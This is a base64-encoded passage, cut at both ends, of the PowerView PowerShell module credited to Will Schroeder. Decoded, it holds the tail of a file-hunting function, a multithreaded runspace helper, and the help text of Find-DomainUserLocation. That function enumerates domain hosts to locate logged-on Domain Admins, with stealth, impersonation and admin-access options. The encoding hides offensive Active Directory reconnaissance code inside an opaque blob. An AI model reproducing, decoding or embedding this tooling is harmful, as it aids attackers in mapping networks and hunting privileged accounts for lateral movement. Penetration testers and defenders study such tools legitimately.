MYXN0QWNjZXNzVGltZSAtYW5kICgkXy5MYXN0QWNjZXNzVGltZSAtbHQgJExhc3RBY2Nlc3NUaW1lKSkgewogICAgICAgICAgICAgICAgICAgICRDb250aW51ZSA9ICRGYWxzZQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snTGFzdFdyaXRlVGltZSddIC1hbmQgKCRfLkxhc3RXcml0ZVRpbWUgLWx0ICRMYXN0V3JpdGVUaW1lKSkgewogICAgICAgICAgICAgICAgICAgICRDb250aW51ZSA9ICRGYWxzZQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ3JlYXRpb25UaW1lJ10gLWFuZCAoJF8uQ3JlYXRpb25UaW1lIC1sdCAkQ3JlYXRpb25UaW1lKSkgewogICAgICAgICAgICAgICAgICAgICRDb250aW51ZSA9ICRGYWxzZQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ2hlY2tXcml0ZUFjY2VzcyddIC1hbmQgKC1ub3QgKFRlc3QtV3JpdGUgLVBhdGggJF8uRnVsbE5hbWUpKSkgewogICAgICAgICAgICAgICAgICAgICRDb250aW51ZSA9ICRGYWxzZQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgaWYgKCRDb250aW51ZSkgewogICAgICAgICAgICAgICAgICAgICRGaWxlUGFyYW1zID0gQHsKICAgICAgICAgICAgICAgICAgICAgICAgJ1BhdGgnID0gJF8uRnVsbE5hbWUKICAgICAgICAgICAgICAgICAgICAgICAgJ093bmVyJyA9ICQoKEdldC1BY2wgJF8uRnVsbE5hbWUpLk93bmVyKQogICAgICAgICAgICAgICAgICAgICAgICAnTGFzdEFjY2Vzc1RpbWUnID0gJF8uTGFzdEFjY2Vzc1RpbWUKICAgICAgICAgICAgICAgICAgICAgICAgJ0xhc3RXcml0ZVRpbWUnID0gJF8uTGFzdFdyaXRlVGltZQogICAgICAgICAgICAgICAgICAgICAgICAnQ3JlYXRpb25UaW1lJyA9ICRfLkNyZWF0aW9uVGltZQogICAgICAgICAgICAgICAgICAgICAgICAnTGVuZ3RoJyA9ICRfLkxlbmd0aAogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAkRm91bmRGaWxlID0gTmV3LU9iamVjdCAtVHlwZU5hbWUgUFNPYmplY3QgLVByb3BlcnR5ICRGaWxlUGFyYW1zCiAgICAgICAgICAgICAgICAgICAgJEZvdW5kRmlsZS5QU09iamVjdC5UeXBlTmFtZXMuSW5zZXJ0KDAsICdQb3dlclZpZXcuRm91bmRGaWxlJykKICAgICAgICAgICAgICAgICAgICAkRm91bmRGaWxlCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICB9CgogICAgRU5EIHsKICAgICAgICAjIHJlbW92ZSB0aGUgSVBDJCBtYXBwaW5ncwogICAgICAgICRNYXBwZWRDb21wdXRlcnMuS2V5cyB8IFJlbW92ZS1SZW1vdGVDb25uZWN0aW9uCiAgICB9Cn0KCgojIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIwojCiMgJ01ldGEnLWZ1bmN0aW9ucyBzdGFydCBiZWxvdwojCiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjCgpmdW5jdGlvbiBOZXctVGhyZWFkZWRGdW5jdGlvbiB7CiAgICAjIEhlbHBlciB1c2VkIGJ5IGFueSB0aHJlYWRlZCBob3N0IGVudW1lcmF0aW9uIGZ1bmN0aW9ucwogICAgW0RpYWdub3N0aWNzLkNvZGVBbmFseXNpcy5TdXBwcmVzc01lc3NhZ2VBdHRyaWJ1dGUoJ1BTVXNlU2hvdWxkUHJvY2Vzc0ZvclN0YXRlQ2hhbmdpbmdGdW5jdGlvbnMnLCAnJyldCiAgICBbQ21kbGV0QmluZGluZygpXQogICAgUGFyYW0oCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDAsIE1hbmRhdG9yeSA9ICRUcnVlLCBWYWx1ZUZyb21QaXBlbGluZSA9ICRUcnVlLCBWYWx1ZUZyb21QaXBlbGluZUJ5UHJvcGVydHlOYW1lID0gJFRydWUpXQogICAgICAgIFtTdHJpbmdbXV0KICAgICAgICAkQ29tcHV0ZXJOYW1lLAoKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMSwgTWFuZGF0b3J5ID0gJFRydWUpXQogICAgICAgIFtTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLlNjcmlwdEJsb2NrXQogICAgICAgICRTY3JpcHRCbG9jaywKCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDIpXQogICAgICAgIFtIYXNodGFibGVdCiAgICAgICAgJFNjcmlwdFBhcmFtZXRlcnMsCgogICAgICAgIFtJbnRdCiAgICAgICAgW1ZhbGlkYXRlUmFuZ2UoMSwgIDEwMCldCiAgICAgICAgJFRocmVhZHMgPSAyMCwKCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkTm9JbXBvcnRzCiAgICApCgogICAgQkVHSU4gewogICAgICAgICMgQWRhcHRlZCBmcm9tOgogICAgICAgICMgICBodHRwOi8vcG93ZXJzaGVsbC5vcmcvd3AvZm9ydW1zL3RvcGljL2ludnBrZS1wYXJhbGxlbC1uZWVkLWhlbHAtdG8tY2xvbmUtdGhlLWN1cnJlbnQtcnVuc3BhY2UvCiAgICAgICAgJFNlc3Npb25TdGF0ZSA9IFtTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLlJ1bnNwYWNlcy5Jbml0aWFsU2Vzc2lvblN0YXRlXTo6Q3JlYXRlRGVmYXVsdCgpCgogICAgICAgICMgIyAkU2Vzc2lvblN0YXRlLkFwYXJ0bWVudFN0YXRlID0gW1N5c3RlbS5UaHJlYWRpbmcuVGhyZWFkXTo6Q3VycmVudFRocmVhZC5HZXRBcGFydG1lbnRTdGF0ZSgpCiAgICAgICAgIyBmb3JjZSBhIHNpbmdsZS10aHJlYWRlZCBhcGFydG1lbnQgc3RhdGUgKGZvciB0b2tlbi1pbXBlcnNvbmF0aW9uIHN0dWZmeikKICAgICAgICAkU2Vzc2lvblN0YXRlLkFwYXJ0bWVudFN0YXRlID0gW1N5c3RlbS5UaHJlYWRpbmcuQXBhcnRtZW50U3RhdGVdOjpTVEEKCiAgICAgICAgIyBpbXBvcnQgdGhlIGN1cnJlbnQgc2Vzc2lvbiBzdGF0ZSdzIHZhcmlhYmxlcyBhbmQgZnVuY3Rpb25zIHNvIHRoZSBjaGFpbmVkIFBvd2VyVmlldwogICAgICAgICMgICBmdW5jdGlvbmFsaXR5IGNhbiBiZSB1c2VkIGJ5IHRoZSB0aHJlYWRlZCBibG9ja3MKICAgICAgICBpZiAoLW5vdCAkTm9JbXBvcnRzKSB7CiAgICAgICAgICAgICMgZ3JhYiBhbGwgdGhlIGN1cnJlbnQgdmFyaWFibGVzIGZvciB0aGlzIHJ1bnNwYWNlCiAgICAgICAgICAgICRNeVZhcnMgPSBHZXQtVmFyaWFibGUgLVNjb3BlIDIKCiAgICAgICAgICAgICMgdGhlc2UgVmFyaWFibGVzIGFyZSBhZGRlZCBieSBSdW5zcGFjZS5PcGVuKCkgTWV0aG9kIGFuZCBwcm9kdWNlIFN0b3AgZXJyb3JzIGlmIHlvdSBhZGQgdGhlbSB0d2ljZQogICAgICAgICAgICAkVm9yYmlkZGVuVmFycyA9IEAoJz8nLCdhcmdzJywnQ29uc29sZUZpbGVOYW1lJywnRXJyb3InLCdFeGVjdXRpb25Db250ZXh0JywnZmFsc2UnLCdIT01FJywnSG9zdCcsJ2lucHV0JywnSW5wdXRPYmplY3QnLCdNYXhpbXVtQWxpYXNDb3VudCcsJ01heGltdW1Ecml2ZUNvdW50JywnTWF4aW11bUVycm9yQ291bnQnLCdNYXhpbXVtRnVuY3Rpb25Db3VudCcsJ01heGltdW1IaXN0b3J5Q291bnQnLCdNYXhpbXVtVmFyaWFibGVDb3VudCcsJ015SW52b2NhdGlvbicsJ251bGwnLCdQSUQnLCdQU0JvdW5kUGFyYW1ldGVycycsJ1BTQ29tbWFuZFBhdGgnLCdQU0N1bHR1cmUnLCdQU0RlZmF1bHRQYXJhbWV0ZXJWYWx1ZXMnLCdQU0hPTUUnLCdQU1NjcmlwdFJvb3QnLCdQU1VJQ3VsdHVyZScsJ1BTVmVyc2lvblRhYmxlJywnUFdEJywnU2hlbGxJZCcsJ1N5bmNocm9uaXplZEhhc2gnLCd0cnVlJykKCiAgICAgICAgICAgICMgYWRkIFZhcmlhYmxlcyBmcm9tIFBhcmVudCBTY29wZSAoY3VycmVudCBydW5zcGFjZSkgaW50byB0aGUgSW5pdGlhbFNlc3Npb25TdGF0ZQogICAgICAgICAgICBGb3JFYWNoICgkVmFyIGluICRNeVZhcnMpIHsKICAgICAgICAgICAgICAgIGlmICgkVm9yYmlkZGVuVmFycyAtTm90Q29udGFpbnMgJFZhci5OYW1lKSB7CiAgICAgICAgICAgICAgICAkU2Vzc2lvblN0YXRlLlZhcmlhYmxlcy5BZGQoKE5ldy1PYmplY3QgLVR5cGVOYW1lIFN5c3RlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb24uUnVuc3BhY2VzLlNlc3Npb25TdGF0ZVZhcmlhYmxlRW50cnkgLUFyZ3VtZW50TGlzdCAkVmFyLm5hbWUsJFZhci5WYWx1ZSwkVmFyLmRlc2NyaXB0aW9uLCRWYXIub3B0aW9ucywkVmFyLmF0dHJpYnV0ZXMpKQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CgogICAgICAgICAgICAjIGFkZCBGdW5jdGlvbnMgZnJvbSBjdXJyZW50IHJ1bnNwYWNlIHRvIHRoZSBJbml0aWFsU2Vzc2lvblN0YXRlCiAgICAgICAgICAgIEZvckVhY2ggKCRGdW5jdGlvbiBpbiAoR2V0LUNoaWxkSXRlbSBGdW5jdGlvbjopKSB7CiAgICAgICAgICAgICAgICAkU2Vzc2lvblN0YXRlLkNvbW1hbmRzLkFkZCgoTmV3LU9iamVjdCAtVHlwZU5hbWUgU3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5SdW5zcGFjZXMuU2Vzc2lvblN0YXRlRnVuY3Rpb25FbnRyeSAtQXJndW1lbnRMaXN0ICRGdW5jdGlvbi5OYW1lLCAkRnVuY3Rpb24uRGVmaW5pdGlvbikpCiAgICAgICAgICAgIH0KICAgICAgICB9CgogICAgICAgICMgdGhyZWFkaW5nIGFkYXB0ZWQgZnJvbQogICAgICAgICMgaHR0cHM6Ly9naXRodWIuY29tL2RhcmtvcGVyYXRvci9Qb3NoLVNlY01vZC9ibG9iL21hc3Rlci9EaXNjb3ZlcnkvRGlzY292ZXJ5LnBzbTEjTDQwNwogICAgICAgICMgICBUaGFua3MgQ2FybG9zIQoKICAgICAgICAjIGNyZWF0ZSBhIHBvb2wgb2YgbWF4VGhyZWFkIHJ1bnNwYWNlcwogICAgICAgICRQb29sID0gW1J1bnNwYWNlRmFjdG9yeV06OkNyZWF0ZVJ1bnNwYWNlUG9vbCgxLCAkVGhyZWFkcywgJFNlc3Npb25TdGF0ZSwgJEhvc3QpCiAgICAgICAgJFBvb2wuT3BlbigpCgogICAgICAgICMgZG8gc29tZSB0cmlja2VyeSB0byBnZXQgdGhlIHByb3BlciBCZWdpbkludm9rZSgpIG1ldGhvZCB0aGF0IGFsbG93cyBmb3IgYW4gb3V0cHV0IHF1ZXVlCiAgICAgICAgJE1ldGhvZCA9ICROdWxsCiAgICAgICAgRm9yRWFjaCAoJE0gaW4gW1Bvd2VyU2hlbGxdLkdldE1ldGhvZHMoKSB8IFdoZXJlLU9iamVjdCB7ICRfLk5hbWUgLWVxICdCZWdpbkludm9rZScgfSkgewogICAgICAgICAgICAkTWV0aG9kUGFyYW1ldGVycyA9ICRNLkdldFBhcmFtZXRlcnMoKQogICAgICAgICAgICBpZiAoKCRNZXRob2RQYXJhbWV0ZXJzLkNvdW50IC1lcSAyKSAtYW5kICRNZXRob2RQYXJhbWV0ZXJzWzBdLk5hbWUgLWVxICdpbnB1dCcgLWFuZCAkTWV0aG9kUGFyYW1ldGVyc1sxXS5OYW1lIC1lcSAnb3V0cHV0JykgewogICAgICAgICAgICAgICAgJE1ldGhvZCA9ICRNLk1ha2VHZW5lcmljTWV0aG9kKFtPYmplY3RdLCBbT2JqZWN0XSkKICAgICAgICAgICAgICAgIGJyZWFrCiAgICAgICAgICAgIH0KICAgICAgICB9CgogICAgICAgICRKb2JzID0gQCgpCiAgICAgICAgJENvbXB1dGVyTmFtZSA9ICRDb21wdXRlck5hbWUgfCBXaGVyZS1PYmplY3QgeyRfIC1hbmQgJF8uVHJpbSgpfQogICAgICAgIFdyaXRlLVZlcmJvc2UgIltOZXctVGhyZWFkZWRGdW5jdGlvbl0gVG90YWwgbnVtYmVyIG9mIGhvc3RzOiAkKCRDb21wdXRlck5hbWUuY291bnQpIgoKICAgICAgICAjIHBhcnRpdGlvbiBhbGwgaG9zdHMgZnJvbSAtQ29tcHV0ZXJOYW1lIGludG8gJFRocmVhZHMgbnVtYmVyIG9mIGdyb3VwcwogICAgICAgIGlmICgkVGhyZWFkcyAtZ2UgJENvbXB1dGVyTmFtZS5MZW5ndGgpIHsKICAgICAgICAgICAgJFRocmVhZHMgPSAkQ29tcHV0ZXJOYW1lLkxlbmd0aAogICAgICAgIH0KICAgICAgICAkRWxlbWVudFNwbGl0U2l6ZSA9IFtJbnRdKCRDb21wdXRlck5hbWUuTGVuZ3RoLyRUaHJlYWRzKQogICAgICAgICRDb21wdXRlck5hbWVQYXJ0aXRpb25lZCA9IEAoKQogICAgICAgICRTdGFydCA9IDAKICAgICAgICAkRW5kID0gJEVsZW1lbnRTcGxpdFNpemUKCiAgICAgICAgZm9yKCRpID0gMTsgJGkgLWxlICRUaHJlYWRzOyAkaSsrKSB7CiAgICAgICAgICAgICRMaXN0ID0gTmV3LU9iamVjdCBTeXN0ZW0uQ29sbGVjdGlvbnMuQXJyYXlMaXN0CiAgICAgICAgICAgIGlmICgkaSAtZXEgJFRocmVhZHMpIHsKICAgICAgICAgICAgICAgICRFbmQgPSAkQ29tcHV0ZXJOYW1lLkxlbmd0aAogICAgICAgICAgICB9CiAgICAgICAgICAgICRMaXN0LkFkZFJhbmdlKCRDb21wdXRlck5hbWVbJFN0YXJ0Li4oJEVuZC0xKV0pCiAgICAgICAgICAgICRTdGFydCArPSAkRWxlbWVudFNwbGl0U2l6ZQogICAgICAgICAgICAkRW5kICs9ICRFbGVtZW50U3BsaXRTaXplCiAgICAgICAgICAgICRDb21wdXRlck5hbWVQYXJ0aXRpb25lZCArPSBAKCxAKCRMaXN0LlRvQXJyYXkoKSkpCiAgICAgICAgfQoKICAgICAgICBXcml0ZS1WZXJib3NlICJbTmV3LVRocmVhZGVkRnVuY3Rpb25dIFRvdGFsIG51bWJlciBvZiB0aHJlYWRzL3BhcnRpdGlvbnM6ICRUaHJlYWRzIgoKICAgICAgICBGb3JFYWNoICgkQ29tcHV0ZXJOYW1lUGFydGl0aW9uIGluICRDb21wdXRlck5hbWVQYXJ0aXRpb25lZCkgewogICAgICAgICAgICAjIGNyZWF0ZSBhICJwb3dlcnNoZWxsIHBpcGVsaW5lIHJ1bm5lciIKICAgICAgICAgICAgJFBvd2VyU2hlbGwgPSBbUG93ZXJTaGVsbF06OkNyZWF0ZSgpCiAgICAgICAgICAgICRQb3dlclNoZWxsLnJ1bnNwYWNlcG9vbCA9ICRQb29sCgogICAgICAgICAgICAjIGFkZCB0aGUgc2NyaXB0IGJsb2NrICsgYXJndW1lbnRzIHdpdGggdGhlIGdpdmVuIGNvbXB1dGVyIHBhcnRpdGlvbgogICAgICAgICAgICAkTnVsbCA9ICRQb3dlclNoZWxsLkFkZFNjcmlwdCgkU2NyaXB0QmxvY2spLkFkZFBhcmFtZXRlcignQ29tcHV0ZXJOYW1lJywgJENvbXB1dGVyTmFtZVBhcnRpdGlvbikKICAgICAgICAgICAgaWYgKCRTY3JpcHRQYXJhbWV0ZXJzKSB7CiAgICAgICAgICAgICAgICBGb3JFYWNoICgkUGFyYW0gaW4gJFNjcmlwdFBhcmFtZXRlcnMuR2V0RW51bWVyYXRvcigpKSB7CiAgICAgICAgICAgICAgICAgICAgJE51bGwgPSAkUG93ZXJTaGVsbC5BZGRQYXJhbWV0ZXIoJFBhcmFtLk5hbWUsICRQYXJhbS5WYWx1ZSkKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQoKICAgICAgICAgICAgIyBjcmVhdGUgdGhlIG91dHB1dCBxdWV1ZQogICAgICAgICAgICAkT3V0cHV0ID0gTmV3LU9iamVjdCBNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNEYXRhQ29sbGVjdGlvbltPYmplY3RdCgogICAgICAgICAgICAjIGtpY2sgb2ZmIGV4ZWN1dGlvbiB1c2luZyB0aGUgQmVnaW5JbnZvaygpIG1ldGhvZCB0aGF0IGFsbG93cyBxdWV1ZXMKICAgICAgICAgICAgJEpvYnMgKz0gQHsKICAgICAgICAgICAgICAgIFBTID0gJFBvd2VyU2hlbGwKICAgICAgICAgICAgICAgIE91dHB1dCA9ICRPdXRwdXQKICAgICAgICAgICAgICAgIFJlc3VsdCA9ICRNZXRob2QuSW52b2tlKCRQb3dlclNoZWxsLCBAKCROdWxsLCBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTRGF0YUNvbGxlY3Rpb25bT2JqZWN0XV0kT3V0cHV0KSkKICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KCiAgICBFTkQgewogICAgICAgIFdyaXRlLVZlcmJvc2UgIltOZXctVGhyZWFkZWRGdW5jdGlvbl0gVGhyZWFkcyBleGVjdXRpbmciCgogICAgICAgICMgY29udGludW91c2x5IGxvb3AgdGhyb3VnaCBlYWNoIGpvYiBxdWV1ZSwgY29uc3VtaW5nIG91dHB1dCBhcyBhcHByb3ByaWF0ZQogICAgICAgIERvIHsKICAgICAgICAgICAgRm9yRWFjaCAoJEpvYiBpbiAkSm9icykgewogICAgICAgICAgICAgICAgJEpvYi5PdXRwdXQuUmVhZEFsbCgpCiAgICAgICAgICAgIH0KICAgICAgICAgICAgU3RhcnQtU2xlZXAgLVNlY29uZHMgMQogICAgICAgIH0KICAgICAgICBXaGlsZSAoKCRKb2JzIHwgV2hlcmUtT2JqZWN0IHsgLW5vdCAkXy5SZXN1bHQuSXNDb21wbGV0ZWQgfSkuQ291bnQgLWd0IDApCgogICAgICAgICRTbGVlcFNlY29uZHMgPSAxMDAKICAgICAgICBXcml0ZS1WZXJib3NlICJbTmV3LVRocmVhZGVkRnVuY3Rpb25dIFdhaXRpbmcgJFNsZWVwU2Vjb25kcyBzZWNvbmRzIGZvciBmaW5hbCBjbGVhbnVwLi4uIgoKICAgICAgICAjIGNsZWFudXAtIG1ha2Ugc3VyZSB3ZSBkaWRuJ3QgbWlzcyBhbnl0aGluZwogICAgICAgIGZvciAoJGk9MDsgJGkgLWx0ICRTbGVlcFNlY29uZHM7ICRpKyspIHsKICAgICAgICAgICAgRm9yRWFjaCAoJEpvYiBpbiAkSm9icykgewogICAgICAgICAgICAgICAgJEpvYi5PdXRwdXQuUmVhZEFsbCgpCiAgICAgICAgICAgICAgICAkSm9iLlBTLkRpc3Bvc2UoKQogICAgICAgICAgICB9CiAgICAgICAgICAgIFN0YXJ0LVNsZWVwIC1TIDEKICAgICAgICB9CgogICAgICAgICRQb29sLkRpc3Bvc2UoKQogICAgICAgIFdyaXRlLVZlcmJvc2UgIltOZXctVGhyZWFkZWRGdW5jdGlvbl0gYWxsIHRocmVhZHMgY29tcGxldGVkIgogICAgfQp9CgoKZnVuY3Rpb24gRmluZC1Eb21haW5Vc2VyTG9jYXRpb24gewo8IwouU1lOT1BTSVMKCkZpbmRzIGRvbWFpbiBtYWNoaW5lcyB3aGVyZSBzcGVjaWZpYyB1c2VycyBhcmUgbG9nZ2VkIGludG8uCgpBdXRob3I6IFdpbGwgU2Nocm9lZGVyIChAaGFybWoweSkgIApMaWNlbnNlOiBCU0QgMy1DbGF1c2UgIApSZXF1aXJlZCBEZXBlbmRlbmNpZXM6IEdldC1Eb21haW5GaWxlU2VydmVyLCBHZXQtRG9tYWluREZTU2hhcmUsIEdldC1Eb21haW5Db250cm9sbGVyLCBHZXQtRG9tYWluQ29tcHV0ZXIsIEdldC1Eb21haW5Vc2VyLCBHZXQtRG9tYWluR3JvdXBNZW1iZXIsIEludm9rZS1Vc2VySW1wZXJzb25hdGlvbiwgSW52b2tlLVJldmVydFRvU2VsZiwgR2V0LU5ldFNlc3Npb24sIFRlc3QtQWRtaW5BY2Nlc3MsIEdldC1OZXRMb2dnZWRvbiwgUmVzb2x2ZS1JUEFkZHJlc3MsIE5ldy1UaHJlYWRlZEZ1bmN0aW9uICAKCi5ERVNDUklQVElPTgoKVGhpcyBmdW5jdGlvbiBlbnVtZXJhdGVzIGFsbCBtYWNoaW5lcyBvbiB0aGUgY3VycmVudCAob3Igc3BlY2lmaWVkKSBkb21haW4KdXNpbmcgR2V0LURvbWFpbkNvbXB1dGVyLCBhbmQgcXVlcmllcyB0aGUgZG9tYWluIGZvciB1c2VycyBvZiBhIHNwZWNpZmllZCBncm91cAooZGVmYXVsdCAnRG9tYWluIEFkbWlucycpIHdpdGggR2V0LURvbWFpbkdyb3VwTWVtYmVyLiBUaGVuIGZvciBlYWNoIHNlcnZlciB0aGUKZnVuY3Rpb24gZW51bWVyYXRlcyBhbnkgYWN0aXZlIHVzZXIgc2Vzc2lvbnMgd2l0aCBHZXQtTmV0U2Vzc2lvbi9HZXQtTmV0TG9nZ2Vkb24KVGhlIGZvdW5kIHVzZXIgbGlzdCBpcyBjb21wYXJlZCBhZ2FpbnN0IHRoZSB0YXJnZXQgbGlzdCwgYW5kIGFueSBtYXRjaGVzIGFyZQpkaXNwbGF5ZWQuIElmIC1TaG93QWxsIGlzIHNwZWNpZmllZCwgYWxsIHJlc3VsdHMgYXJlIGRpc3BsYXllZCBpbnN0ZWFkIG9mCnRoZSBmaWx0ZXJlZCBzZXQuIElmIC1TdGVhbHRoIGlzIHNwZWNpZmllZCwgdGhlbiBsaWtlbHkgaGlnaGx5LXRyYWZmaWNlZCBzZXJ2ZXJzCmFyZSBlbnVtZXJhdGVkIHdpdGggR2V0LURvbWFpbkZpbGVTZXJ2ZXIvR2V0LURvbWFpbkNvbnRyb2xsZXIsIGFuZCBzZXNzaW9uCmVudW1lcmF0aW9uIGlzIGV4ZWN1dGVkIG9ubHkgYWdhaW5zdCB0aG9zZSBzZXJ2ZXJzLiBJZiAtQ3JlZGVudGlhbCBpcyBwYXNzZWQsCnRoZW4gSW52b2tlLVVzZXJJbXBlcnNvbmF0aW9uIGlzIHVzZWQgdG8gaW1wZXJzb25hdGUgdGhlIHNwZWNpZmllZCB1c2VyCmJlZm9yZSBlbnVtZXJhdGlvbiwgcmV2ZXJ0aW5nIGFmdGVyIHdpdGggSW52b2tlLVJldmVydFRvU2VsZi4KCi5QQVJBTUVURVIgQ29tcHV0ZXJOYW1lCgpTcGVjaWZpZXMgYW4gYXJyYXkgb2Ygb25lIG9yIG1vcmUgaG9zdHMgdG8gZW51bWVyYXRlLCBwYXNzYWJsZSBvbiB0aGUgcGlwZWxpbmUuCklmIC1Db21wdXRlck5hbWUgaXMgbm90IHBhc3NlZCwgdGhlIGRlZmF1bHQgYmVoYXZpb3IgaXMgdG8gZW51bWVyYXRlIGFsbCBtYWNoaW5lcwppbiB0aGUgZG9tYWluIHJldHVybmVkIGJ5IEdldC1Eb21haW5Db21wdXRlci4KCi5QQVJBTUVURVIgRG9tYWluCgpTcGVjaWZpZXMgdGhlIGRvbWFpbiB0byBxdWVyeSBmb3IgY29tcHV0ZXJzIEFORCB1c2VycywgZGVmYXVsdHMgdG8gdGhlIGN1cnJlbnQgZG9tYWluLgoKLlBBUkFNRVRFUiBDb21wdXRlckRvbWFpbgoKU3BlY2lmaWVzIHRoZSBkb21haW4gdG8gcXVlcnkgZm9yIGNvbXB1dGVycywgZGVmYXVsdHMgdG8gdGhlIGN1cnJlbnQgZG9tYWluLgoKLlBBUkFNRVRFUiBDb21wdXRlckxEQVBGaWx0ZXIKClNwZWNpZmllcyBhbiBMREFQIHF1ZXJ5IHN0cmluZyB0aGF0IGlzIHVzZWQgdG8gc2VhcmNoIGZvciBjb21wdXRlciBvYmplY3RzLgoKLlBBUkFNRVRFUiBDb21wdXRlclNlYXJjaEJhc2UKClNwZWNpZmllcyB0aGUgTERBUCBzb3VyY2UgdG8gc2VhcmNoIHRocm91Z2ggZm9yIGNvbXB1dGVycywKZS5nLiAiTERBUDovL09VPXNlY3JldCxEQz10ZXN0bGFiLERDPWxvY2FsIi4gVXNlZnVsIGZvciBPVSBxdWVyaWVzLgoKLlBBUkFNRVRFUiBDb21wdXRlclVuY29uc3RyYWluZWQKClN3aXRjaC4gU2VhcmNoIGNvbXB1dGVyIG9iamVjdHMgdGhhdCBoYXZlIHVuY29uc3RyYWluZWQgZGVsZWdhdGlvbi4KCi5QQVJBTUVURVIgQ29tcHV0ZXJPcGVyYXRpbmdTeXN0ZW0KClNlYXJjaCBjb21wdXRlcnMgd2l0aCBhIHNwZWNpZmljIG9wZXJhdGluZyBzeXN0ZW0sIHdpbGRjYXJkcyBhY2NlcHRlZC4KCi5QQVJBTUVURVIgQ29tcHV0ZXJTZXJ2aWNlUGFjawoKU2VhcmNoIGNvbXB1dGVycyB3aXRoIGEgc3BlY2lmaWMgc2VydmljZSBwYWNrLCB3aWxkY2FyZHMgYWNjZXB0ZWQuCgouUEFSQU1FVEVSIENvbXB1dGVyU2l0ZU5hbWUKClNlYXJjaCBjb21wdXRlcnMgaW4gdGhlIHNwZWNpZmljIEFEIFNpdGUgbmFtZSwgd2lsZGNhcmRzIGFjY2VwdGVkLgoKLlBBUkFNRVRFUiBVc2VySWRlbnRpdHkKClNwZWNpZmllcyBvbmUgb3IgbW9yZSB1c2VyIGlkZW50aXRpZXMgdG8gc2VhcmNoIGZvci4KCi5QQVJBTUVURVIgVXNlckRvbWFpbgoKU3BlY2lmaWVzIHRoZSBkb21haW4gdG8gcXVlcnkgZm9yIHVzZXJzIHRvIHNlYXJjaCBmb3IsIGRlZmF1bHRzIHRvIHRoZSBjdXJyZW50IGRvbWFpbi4KCi5QQVJBTUVURVIgVXNlckxEQVBGaWx0ZXIKClNwZWNpZmllcyBhbiBMREFQIHF1ZXJ5IHN0cmluZyB0aGF0IGlzIHVzZWQgdG8gc2VhcmNoIGZvciB0YXJnZXQgdXNlcnMuCgouUEFSQU1FVEVSIFVzZXJTZWFyY2hCYXNlCgpTcGVjaWZpZXMgdGhlIExEQVAgc291cmNlIHRvIHNlYXJjaCB0aHJvdWdoIGZvciB0YXJnZXQgdXNlcnMuCmUuZy4gIkxEQVA6Ly9PVT1zZWNyZXQsREM9dGVzdGxhYixEQz1sb2NhbCIuIFVzZWZ1bCBmb3IgT1UgcXVlcmllcy4KCi5QQVJBTUVURVIgVXNlckdyb3VwSWRlbnRpdHkKClNwZWNpZmllcyBhIGdyb3VwIGlkZW50aXR5IHRvIHF1ZXJ5IGZvciB0YXJnZXQgdXNlcnMsIGRlZmF1bHRzIHRvICdEb21haW4gQWRtaW5zLgpJZiBhbnkgb3RoZXIgdXNlciBzcGVjaWZpY2F0aW9ucyBhcmUgc2V0LCB0aGVuIFVzZXJHcm91cElkZW50aXR5IGlzIGlnbm9yZWQuCgouUEFSQU1FVEVSIFVzZXJBZG1pbkNvdW50CgpTd2l0Y2guIFNlYXJjaCBmb3IgdXNlcnMgdXNlcnMgd2l0aCAnKGFkbWluQ291bnQ9MSknIChtZWFuaW5nIGFyZS93ZXJlIHByaXZpbGVnZWQpLgoKLlBBUkFNRVRFUiBVc2VyQWxsb3dEZWxlZ2F0aW9uCgpTd2l0Y2guIFNlYXJjaCBmb3IgdXNlciBhY2NvdW50cyB0aGF0IGFyZSBub3QgbWFya2VkIGFzICdzZW5zaXRpdmUgYW5kIG5vdCBhbGxvd2VkIGZvciBkZWxlZ2F0aW9uJy4KCi5QQVJBTUVURVIgQ2hlY2tBY2Nlc3MKClN3aXRjaC4gQ2hlY2sgaWYgdGhlIGN1cnJlbnQgdXNlciBoYXMgbG9jYWwgYWRtaW4gYWNjZXNzIHRvIGNvbXB1dGVycyB3aGVyZSB0YXJnZXQgdXNlcnMgYXJlIGZvdW5kLgoKLlBBUkFNRVRFUiBTZXJ2ZXIKClNwZWNpZmllcyBhbiBBY3RpdmUgRGlyZWN0b3J5IHNlcnZlciAoZG9tYWluIGNvbnRyb2xsZXIpIHRvIGJpbmQgdG8uCgouUEFSQU1FVEVSIFNlYXJjaFNjb3BlCgpTcGVjaWZpZXMgdGhlIHNjb3BlIHRvIHNlYXJjaCB1bmRlciBmb3IgY29tcHV0ZXJzLCBCYXNlL09uZUxldmVsL1N1YnRyZWUgKGRlZmF1bHQgb2YgU3VidHJlZSkuCgouUEFSQU1FVEVSIFJlc3VsdFBhZ2VTaXplCgpTcGVjaWZpZXMgdGhlIFBhZ2VTaXplIHRvIHNldCBmb3IgdGhlIExEQVAgc2VhcmNoZXIgb2JqZWN0LgoKLlBBUkFNRVRFUiBTZXJ2ZXJUaW1lTGltaXQKClNwZWNpZmllcyB0aGUgbWF4aW11bSBhbW91bnQgb2YgdGltZSB0aGUgc2VydmVyI